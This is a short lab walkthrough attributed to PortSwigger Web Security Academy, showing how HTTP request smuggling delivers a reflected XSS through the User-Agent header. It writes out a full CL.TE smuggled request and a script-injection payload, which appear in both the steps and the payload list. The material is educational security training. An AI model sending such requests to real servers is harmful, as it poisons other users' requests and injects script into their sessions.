## Exploiting HTTP request smuggling to deliver reflected XSS

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

### Solution Steps
1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your User-Agent header in a hidden input.
3. Inject an XSS payload into the User-Agent header and observe that it gets reflected: "/><script>alert(1)</script>
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1

### Key Payloads
- `User-Agent`
- `alert(1)`
- `"/><script>alert(1)</script>`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
---
*Source: PortSwigger Web Security Academy*
